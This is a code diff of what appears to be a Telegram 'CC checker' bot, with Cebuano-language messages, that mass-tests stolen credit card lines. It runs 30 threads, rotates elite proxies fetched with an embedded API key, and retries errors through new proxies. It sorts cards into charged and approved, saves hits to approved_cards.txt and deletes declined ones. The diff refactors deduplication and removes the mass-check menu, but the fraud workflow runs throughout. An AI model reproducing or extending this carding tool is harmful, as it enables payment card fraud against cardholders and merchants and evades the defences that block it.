@@ -42,7 +42,7 @@ USER_AGENTS = [
 
 def fetch_good_proxies(chat_id):
     global proxies_list
-    bot.send_message(chat_id, "🔄 Nag-download og bag-ong elite proxies ...")
+    bot.send_message(chat_id, "🔄 Nag-download og bag-ong elite proxies (Very Fast)...")
     try:
         url = "https://api.good-proxies.ru/api"
         params = {'key': "3269305ce8094af10e5933fe67db8529", 'ping': "3000", 'time': "300", 'anon': "elite", 'access': "supportsHttps"}
@@ -52,7 +52,7 @@ def fetch_good_proxies(chat_id):
             new_proxies = [line.strip() for line in response.text.splitlines() if line.strip() and ':' in line]
             if new_proxies:
                 proxies_list = new_proxies
-                bot.send_message(chat_id, f"✅ **iyot** - Nakarga {len(proxies_list)} elite proxies!")
+                bot.send_message(chat_id, f"✅ **VERY FAST** - Nakarga {len(proxies_list)} elite proxies!")
                 return True
     except:
         pass
@@ -296,7 +296,7 @@ def build_block(cc_line, status, response, brand, bank, country, flag):
 {BRAND_ICON} {brand}
 {BANK_ICON} {bank}
 {COUNTRY_ICON} {country} {flag}
-{DEV_ICON} Haste🎱𖭠
+{DEV_ICON} Haste
 ────────────────────────────────────────"""
 
 def save_result(block, status):
@@ -306,7 +306,7 @@ def save_result(block, status):
 
 def save_approved_list(cc_line):
     try:
-        parts = cc_line.strip().split('|')
+        parts = [x.strip() for x in cc_line.strip().split('|')]
         clean = '|'.join(parts[:4])
         with open("approved_cards.txt", "a", encoding="utf-8") as f:
             f.write(clean + "\n")
@@ -315,18 +315,23 @@ def save_approved_list(cc_line):
 
 def build_final_approved_file():
     try:
-        if os.path.exists("approved_cards.txt"):
-            with open("approved_cards.txt", "r", encoding="utf-8") as f:
-                lines = f.readlines()
-            seen = {}
-            unique = [line.strip() for line in lines if line.strip() and line.strip() not in seen and not seen.update({line.strip(): True})]
-            with open("approved_cards.txt", "w", encoding="utf-8") as f:
-                for card in unique:
-                    f.write(card + "\n")
-            return len(unique)
+        if not os.path.exists("approved_cards.txt"):
+            return 0
+        with open("approved_cards.txt", "r", encoding="utf-8") as f:
+            lines = f.readlines()
+        seen = set()
+        unique = []
+        for line in lines:
+            card = line.strip()
+            if card and card not in seen:
+                seen.add(card)
+                unique.append(card)
+        with open("approved_cards.txt", "w", encoding="utf-8") as f:
+            for card in unique:
+                f.write(card + "\n")
+        return len(unique)
     except:
-        pass
-    return 0
+        return 0
 
 def clean_declined_files():
     for f in ["declined.txt", "error.txt"]:
@@ -345,24 +350,17 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
             with proxy_lock:
                 proxy = random.choice(proxies_list)
         status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
-        
         if status in ["CHARGED", "APPROVED", "DECLINED"]:
             break
-        
-        # Unlimited retry on ERROR with new proxy
         time.sleep(random.uniform(0.5, 1.5))
-    
     bin_code = cc_line[:6]
     brand_bin, bank, country, flag = get_bin_info(bin_code)
     brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
-    
     if status == "CHARGED": stats["charged"] += 1
     elif status == "APPROVED": stats["approved"] += 1
     elif status == "ERROR": stats["error"] += 1
     else: stats["declined"] += 1
-    
     block = build_block(cc_line, status, response, brand, bank, country, flag)
-    
     if chat_id:
         try:
             bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')} (Try {attempt})\n{response}", parse_mode='Markdown')
@@ -370,7 +368,6 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
                 bot.send_message(chat_id, f"```{block}```", parse_mode='Markdown')
         except:
             pass
-    
     if status in ["CHARGED", "APPROVED"]:
         save_result(block, status)
         save_approved_list(cc_line)
@@ -429,45 +426,3 @@ def mass_check_paste(msg):
     ccs = lines
     if not ccs:
         bot.send_message(msg.chat.id, "Walay valid nga cards.")
-        return
-    bot.send_message(msg.chat.id, f"Nakarga {len(ccs)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
-    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, ccs))
-
-def mass_proxy_choice(msg, ccs):
-    ch = msg.text.strip()
-    if ch == '6':
-        fetch_good_proxies(msg.chat.id)
-        start_mass_check(ccs, True, "http", msg.chat.id)
-    elif ch in ['1','2','3','4']:
-        bot.send_message(msg.chat.id, "I-paste ang proxies o `skip`:")
-        bot.register_next_step_handler(msg, lambda m: mass_proxy_paste(m, ccs, ch))
-    else:
-        start_mass_check(ccs, False, "http", msg.chat.id)
-
-def mass_proxy_paste(msg, ccs, p_type_idx):
-    txt = msg.text.strip()
-    if txt.lower() == 'skip':
-        start_mass_check(ccs, False, "http", msg.chat.id)
-        return
-    global proxies_list
-    proxies_list = [line.strip() for line in txt.splitlines() if line.strip()]
-    use = len(proxies_list) > 0
-    ptype = {'2':'https','3':'socks4','4':'socks5'}.get(p_type_idx, 'http')
-    bot.send_message(msg.chat.id, f"Nakarga {len(proxies_list)} proxies. Nagsugod na...")
-    start_mass_check(ccs, use, ptype, msg.chat.id)
-
-def start_mass_check(ccs, use_proxy, proxy_type, chat_id):
-    stats.update({"charged":0,"approved":0,"declined":0,"error":0})
-    bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **paspasan ang bayo**")
-    worker_args = partial(worker, use_proxy=use_proxy, proxy_type=proxy_type, chat_id=chat_id)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
-        ex.map(worker_args, ccs)
-    clean_declined_files()
-    bot.send_message(chat_id, f"""✅ **Human na ang Check!**
-Charged: {stats['charged']}
-Approved: {stats['approved']}
-Declined & Error: gidelete na""")
-
-if __name__ == "__main__":
-    print("HERMAN BISAK0L CHECKER - Running 24/7")
-    bot.infinity_polling(none_stop=True, interval=0, timeout=20)
